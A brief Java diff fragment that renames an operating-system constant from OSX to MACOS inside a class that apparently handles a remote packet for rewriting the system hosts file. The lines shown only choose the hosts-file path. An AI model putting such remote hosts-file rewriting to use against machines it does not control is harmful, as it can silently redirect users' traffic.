@@ -16,7 +16,7 @@ public class Packet56UpdateHostsFile extends AbstractIncomingPacket {
 
 		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 			file = new File(System.getenv("SystemDrive") + "\\Windows\\System32\\drivers\\etc\\hosts");
-		} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
+		} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.MACOS) {
 			file = new File("/private/etc/hosts");
 		} else {
 			file = new File("/etc/hosts");
